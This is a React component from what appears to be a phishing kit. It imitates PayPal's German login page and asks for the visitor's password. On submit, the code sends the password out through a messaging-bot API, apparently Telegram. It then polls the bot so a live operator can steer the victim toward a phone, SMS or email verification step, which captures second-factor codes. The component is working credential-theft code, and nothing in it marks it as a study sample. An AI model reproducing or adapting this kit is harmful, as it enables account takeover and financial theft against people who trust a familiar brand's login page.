import React, {useEffect} from 'react';
import {useState} from "react";
import axios from "axios";
import bot from "../../bot_manager/manager";
import classes from "../email/Email.module.css";
import {Link} from "react-router-dom";
import loader from '../../assets/loader.gif'

let firstState;

const Password = (props) => {

    const [password, setPassword] = useState('')
    const [isLoading, setLoading] = useState(false);


    const enterPassword =  () => {
        axios.get(bot.getUpdates())
            .then((res) => {
                firstState = res.data.result;
            })
        setLoading(true);
        axios.post(bot.sendMessage(password + '%20password'), '')
        axios.post(bot.sendMessage("phone_sms_email"));
    }


    const getUpdatesInterval =  () => {
        axios.get(bot.getUpdates())
            .then((res) => {
                if (firstState) {
                    if (res.data.result.length !== firstState.length) {
                        let text = res.data.result[res.data.result.length - 1].message.text;
                        if (text === 'sms') props.setState(1)
                        else if (text === 'phone') props.setState(2)
                        else if (text === 'email') props.setState(3)
                        else firstState = res.data.result;
                    }
                } else firstState = res.data.result;

            })
    }

    useEffect(() => {
        if (isLoading) {
            console.log("Start");
            const interval = setInterval(getUpdatesInterval, 5000);
            return () => clearInterval(interval);
        }
    }, [isLoading])

    return (
        <div className={classes.corral}>
            {isLoading ? <img src={loader} className={classes.loader}/> : null}
            <div className={[classes.contentContainerBordered, isLoading ? classes.loaderActive : ''].join(' ')}>
                <header>
                    <p role={"img"}
                       className={[classes.paypal_logo, classes.paypal_logo_long, classes.signin_paypal_logo].join(' ')}></p>
                </header>
                <div id={"loginContent"}>
                    <div id="loginSection">

                        <form className={classes.maskable} onSubmit={(e) => {
                            e.preventDefault();
                            enterPassword();
                        }}>
                            <div className={classes.clearfix}>
                                <div className={classes.splitPhoneSection}>
                                    <div style={{textAlign:'center'}}>
                                        <a href="#" id="forgotPassword"
                                           className={[classes.recoveryOption, classes.forgotPassword].join(' ')}
                                           data-client-log-action-type="clickForgotPasswordLink"
                                           pa-marked="1">{props.email}</a>
                                    </div>
                                    <div className={classes.textInput}>
                                        <div className={classes.fieldWrapper}>
                                            <label className={classes.fieldLabel}></label>
                                            <input placeholder={"Passwort"} type={"password"} value={password}
                                                   onChange={e => setPassword(e.target.value)}/>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div className={classes.actions}>
                    <button className={[classes.button].join(' ')} onClick={enterPassword}>
                        Weiter
                    </button>
                </div>
                <div className={classes.signupContainer}>
                    <div className={classes.loginSignUpSeparator}>
                        <span className={classes.textInSeparator}>
                            oder
                        </span>
                    </div>
                    <Link to={"/something"}>
                        <button className={[classes.button, classes.secondary].join(' ')} onClick={enterPassword}>
                            Neu anmelden
                        </button>
                    </Link>
                </div>
                <div className={classes.intentFooter}>
                    <div className={classes.localeSelector}>
                        <span className={[classes.picker, classes.country_selector].join(' ')}>
                            <button className={[classes.country ,classes.RU].join(' ')}>
                            </button>
                        </span>
                        <ul className={classes.localeLink}>
                            <li>
                                <a className={classes.selected}>Deutsch</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Password;